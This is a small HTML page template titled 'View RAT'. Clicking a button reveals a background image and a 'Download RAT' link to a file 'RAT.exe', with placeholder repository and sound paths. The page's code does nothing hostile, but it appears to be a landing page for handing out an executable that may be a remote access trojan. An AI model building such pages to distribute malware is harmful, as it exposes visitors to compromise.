<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>View RAT</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      overflow: hidden;
      height: 100%;
      font-family: Arial, sans-serif;
      background-color: black;
    }

    #viewBtn, #downloadBtn {
      position: absolute;
      z-index: 2;
      padding: 15px 30px;
      font-size: 18px;
      border: none;
      cursor: pointer;
      border-radius: 10px;
    }

    #viewBtn {
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: #d32f2f;
      color: white;
    }

    #downloadBtn {
      display: none;
      bottom: 20px;
      right: 20px;
      background-color: #2e7d32;
      color: white;
    }

    #bg {
      position: absolute;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background-image: url('https://raw.githubusercontent.com/yourusername/yourrepo/main/RAT.png');
      background-size: cover;
      background-position: center;
      opacity: 0;
      transition: opacity 1.5s ease-in-out;
      z-index: 1;
    }
  </style>
</head>
<body>

  <div id="bg"></div>

  <button id="viewBtn">View RAT</button>
  <a href="RAT.exe" id="downloadBtn" download>Download RAT</a>

  <audio id="sfx" src="your-sfx.mp3" preload="auto"></audio>

  <script>
    const viewBtn = document.getElementById('viewBtn');
    const downloadBtn = document.getElementById('downloadBtn');
    const bg = document.getElementById('bg');
    const sfx = document.getElementById('sfx');

    viewBtn.addEventListener('click', () => {
      bg.style.opacity = 1;
      sfx.play().catch(e => console.log("Sound error:", e));
      downloadBtn.style.display = 'block';
      viewBtn.style.display = 'none';
    });
  </script>

</body>
</html>
